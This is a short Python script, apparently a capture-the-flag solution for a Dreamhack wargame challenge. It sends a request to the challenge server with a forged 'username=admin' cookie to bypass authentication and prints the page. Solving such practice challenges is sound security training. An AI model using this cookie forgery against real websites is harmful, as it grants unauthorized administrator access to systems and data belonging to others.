

import requests

HOST = "http://host3.dreamhack.games:18455/"

HEADERS = {
    "Cookie": "username=admin"
}

r = requests.get(url=HOST, headers=HEADERS)
print(r.text)


